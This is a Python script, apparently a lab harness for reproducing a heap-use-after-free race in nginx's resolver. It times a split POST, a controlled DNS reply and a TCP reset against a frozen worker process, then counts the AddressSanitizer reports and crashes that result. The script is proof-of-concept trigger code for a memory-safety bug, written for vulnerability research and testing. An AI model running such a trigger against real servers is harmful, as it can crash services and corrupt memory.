# Runs inside a driver container that shares the nginx container's PID namespace and network.
import sys, os, time, socket, random, json
from common import *
variant, method, n = sys.argv[1], sys.argv[2], int(sys.argv[3])
split = "nosplit" not in variant  # partial body so the main request resolves AFTER the mirror
order = "rstfirst" if "rstfirst" in variant else "dnsfirst"
do_freeze = method != "none"
ctl = socket.create_connection(("dns", 5300)); cf = ctl.makefile("rw")
def cmd(s):
    cf.write(s + "\n"); cf.flush(); return cf.readline().strip()
res = dict(variant=variant, method=method, n=n, hits=0, alerts=0, crashes=0, other_asan=0, errors=0, attempts=[])
for i in range(n):
    wait_worker(); cmd("FLUSH")
    name = "a%d-%06x.test" % (i, random.getrandbits(24))
    before, off = asan_files(), errlog_size()
    note = ""
    try:
        s = socket.create_connection(("ngx", 80)); cport = s.getsockname()[1]
        hdr = "POST /?h=%s HTTP/1.1\r\nHost: x\r\nContent-Length: 2\r\n\r\n" % name
        if split:
            s.sendall((hdr + "A").encode())
            if cmd("WAIT %s 3" % name) != "ok": note = "no-query"
            time.sleep(0.05); s.sendall(b"B"); time.sleep(0.05)
        else:
            s.sendall((hdr + "AB").encode())
            if cmd("WAIT %s 3" % name) != "ok": note = "no-query"
            time.sleep(0.05)
        w = wait_worker()[0]
        ws = freeze(method) if do_freeze else None
        def dns_delivered(): return any(r["rx"] > 0 for r in proc_net(w, "udp"))
        def rst_delivered(): return not any(r["rport"] == cport and r["st"] == "01" for r in proc_net(w, "tcp"))
        if order == "dnsfirst":
            cmd("RELEASE nx")
            if do_freeze and not wait_until(dns_delivered): note += " dns-not-seen"
            rst(s)
            if do_freeze and not wait_until(rst_delivered): note += " rst-not-seen"
        else:
            rst(s)
            if do_freeze and not wait_until(rst_delivered): note += " rst-not-seen"
            cmd("RELEASE nx")
            if do_freeze and not wait_until(dns_delivered): note += " dns-not-seen"
        if do_freeze: thaw(method, ws)
    except Exception as e:
        note += " exc:%r" % e; res["errors"] += 1
    time.sleep(0.4)
    new = asan_files() - before
    log = errlog_since(off)
    hit = False
    for f in new:
        t = open(f, errors="replace").read()
        if "heap-use-after-free" in t and "ngx_resolver" in t:
            hit = True
            if not res.get("sample"):
                res["sample"] = 1; open("/out/sample-%s-%s.txt" % (variant, method), "w").write(t)
        else: res["other_asan"] += 1
    alert = "could not cancel" in log
    crash = ("exited on signal" in log) or ("exited with code" in log)
    res["hits"] += hit; res["alerts"] += alert; res["crashes"] += crash
    res["attempts"].append(dict(i=i, hit=hit, alert=alert, crash=crash, note=note.strip()))
    print(i, "HIT" if hit else "-", "alert" if alert else "", "crash" if crash else "", note, flush=True)
print("RESULT " + json.dumps({k: v for k, v in res.items() if k != "attempts"}), flush=True)
